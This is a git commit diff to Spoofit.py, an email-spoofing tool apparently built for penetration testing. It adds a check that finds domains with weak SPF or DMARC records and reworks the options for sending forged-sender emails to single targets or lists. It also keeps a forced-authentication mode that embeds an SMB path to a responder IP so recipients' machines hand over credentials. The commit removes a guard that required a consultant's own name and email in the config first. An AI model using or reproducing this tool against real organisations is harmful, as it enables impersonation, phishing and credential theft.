a6e9c685bf668c151e7519c715e2f8aaf41ee6aa
mattmillen15 <68832392+mattmillen15@users.noreply.github.com>
2024-08-21 21:20:17 -0400

    Update Spoofit.py

--- Spoofit.py
+++ Spoofit.py
@@ -12,6 +12,7 @@ def print_banner():
  ___/ / /_/ / /_/ / /_/ / __/ / /_  
 /____/ .___/\____/\____/_/ /_/\__/  
     /_/                             
+
    """
     print(banner)
 
@@ -61,62 +62,120 @@ def load_config(forced=False):
     else:
         subject = config.get('Email', 'subject')
         body = config.get('Email', 'body')
-    
-    if "<consultant-name>" in body or "<consultant-email>" in body:
-        print("[!] Hold up... you still need to modify conf/spoofit.conf to include your name and Converge email first....")
-        return None
 
     return subject, body
 
 def create_forced_auth_email(body_template, responder_ip):
     return body_template % {'responder': responder_ip}
 
+def check_spoofability(domain):
+    try:
+        spoofable = False
+        weaknesses = []
+
+        try:
+            spf_record = dns.resolver.resolve(domain, 'TXT')
+            spf_record = [str(r) for r in spf_record if "v=spf1" in str(r)]
+            if not spf_record:
+                weaknesses.append("No SPF record found.")
+                spoofable = True
+            elif not any(all_item in spf_record[0] for all_item in ["~all", "-all"]):
+                weaknesses.append("SPF record does not specify ~all or -all.")
+                spoofable = True
+        except dns.resolver.NoAnswer:
+            weaknesses.append("No SPF record found.")
+            spoofable = True
+
+        try:
+            dmarc_record = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
+            dmarc_record = str(dmarc_record[0])
+            if "p=none" in dmarc_record:
+                print(f"\033[93m[!] DMARC policy is set to 'p=none' for {domain}.\033[0m")
+                spoofable = True
+            elif "p=quarantine" in dmarc_record:
+                print(f"\033[93m[!] DMARC policy is set to 'quarantine' for {domain}.\033[0m")
+            elif "p=reject" not in dmarc_record:
+                weaknesses.append("DMARC policy is not set to 'reject'.")
+                spoofable = True
+        except dns.resolver.NoAnswer:
+            weaknesses.append("No DMARC record found.")
+            spoofable = True
+
+        if spoofable:
+            print(f"\033[92m[+] Spoofing possible for {domain}!\033[0m")
+            for weakness in weaknesses:
+                print(f"    - {weakness}")
+        else:
+            print(f"\033[91m[-] Spoofing not possible for {domain}...\033[0m")
+
+    except Exception as e:
+        print(f"[!] Error checking spoofability: {e}")
+
 def main():
     print_banner()
 
-    parser = argparse.ArgumentParser(description="Email Spoofing Tool")
-    parser.add_argument('-s', '--sender', required=True, help='Email address to use as the spoofed sender')
-    parser.add_argument('-r', '--recipients', required=True, help='Recipient email address or file containing multiple addresses')
+    parser = argparse.ArgumentParser(
+        description="Email Spoofing Tool",
+        epilog="""
+Examples:
+  To check if the target domain is spoofable:
+    Spoofit.py -c <domain.com>
+
+  To send a spoofed email to the target (or list of targets):
+    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt>
+
+  To send a spoofed email containing an embedded forced authentication image to a target (or list of targets):
+    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt> -f <responder-ip>
+        """,
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    parser.add_argument('-c', '--check', help='Check if a domain is vulnerable to spoofing (SPF, DMARC)')
+    parser.add_argument('-s', '--sender', help='Email address to use as the spoofed sender')
+    parser.add_argument('-r', '--recipients', help='Recipient email address or file containing multiple addresses')
     parser.add_argument('-f', '--forced', help='Optional: Forced authentication email with responder IP')
 
     args = parser.parse_args()
 
-    # Determine if recipients is a file or a single email
-    recipients = []
-    if os.path.isfile(args.recipients):
-        with open(args.recipients, 'r') as f:
-            recipients = [line.strip() for line in f if line.strip()]
-    else:
-        recipients.append(args.recipients)
-
-    if args.forced:
-        config_result = load_config(forced=True)
-        if config_result is None:
-            return
-
-        email_subject, body_template = config_result
-        email_body = create_forced_auth_email(body_template, args.forced)
-        print(f"... Sending forced authentication email to {len(recipients)} target{'s' if len(recipients) > 1 else ''} with SMB path to {args.forced}.")
-    else:
-        config_result = load_config()
-        if config_result is None:
-            return
-
-        email_subject, email_body = config_result
-        print(f"...Sending spoofed email to {len(recipients)} target{'s' if len(recipients) > 1 else ''}.")
-
-    # Extract domain from sender's email
-    domain = get_domain_from_email(args.sender)
-
-    # Get the MX record for the domain
-    mx_record = get_mx_record(domain)
-    if not mx_record:
-        print("Failed to retrieve MX record. Exiting...")
+    if not any(vars(args).values()):
+        parser.print_help()
         return
 
-    # Send emails to each recipient
-    for recipient in recipients:
-        send_email(mx_record, args.sender, recipient, email_subject, email_body)
+    if args.check:
+        check_spoofability(args.check)
+        return
+
+    if args.recipients and args.sender:
+        recipients = []
+        if os.path.isfile(args.recipients):
+            with open(args.recipients, 'r') as f:
+                recipients = [line.strip() for line in f if line.strip()]
+        else:
+            recipients.append(args.recipients)
+
+        if args.forced:
+            config_result = load_config(forced=True)
+            if config_result is None:
+                return
+
+            email_subject, body_template = config_result
+            email_body = create_forced_auth_email(body_template, args.forced)
+            print(f"[*] Sending forced authentication email to {len(recipients)} target{'s' if len(recipients) > 1 else ''} with SMB path to {args.forced}.")
+        else:
+            config_result = load_config()
+            if config_result is None:
+                return
+
+            email_subject, email_body = config_result
+            print(f"...Sending spoofed email to {len(recipients)} target{'s' if len(recipients) > 1 else ''}.")
+
+        domain = get_domain_from_email(args.sender)
+        mx_record = get_mx_record(domain)
+        if not mx_record:
+            print("Failed to retrieve MX record. Exiting...")
+            return
+
+        for recipient in recipients:
+            send_email(mx_record, args.sender, recipient, email_subject, email_body)
 
 if __name__ == "__main__":
     main()
